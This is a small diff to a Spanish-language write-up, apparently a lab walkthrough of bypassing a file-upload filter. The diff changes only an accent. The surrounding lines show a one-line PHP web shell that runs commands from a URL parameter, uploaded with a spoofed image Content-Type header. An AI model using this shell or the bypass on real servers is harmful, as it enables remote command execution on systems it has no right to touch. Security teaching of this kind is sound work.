@@ -35,7 +35,7 @@ Cargamos la web shell en php siguiente:
 ```php
 <?php echo shell_exec($_GET['cmd']); ?>
 ```
-Procuramos dejar el encabezado `Content-Type: image/png` tal como está, ya que este es un encabezado permitido:
+Procuramos dejar el encabezado `Content-Type: image/png` tal como está, ya que éste es un encabezado permitido:
 ![image](https://github.com/user-attachments/assets/6cf374e1-8761-4ca1-8394-551afe7d59f8)
 
 El servidor realiza la validación únicamente sobre el encabezado Content-Type, el cual es fácilmente manipulable por el cliente. No verifica la extensión ni inspecciona el contenido real del archivo.
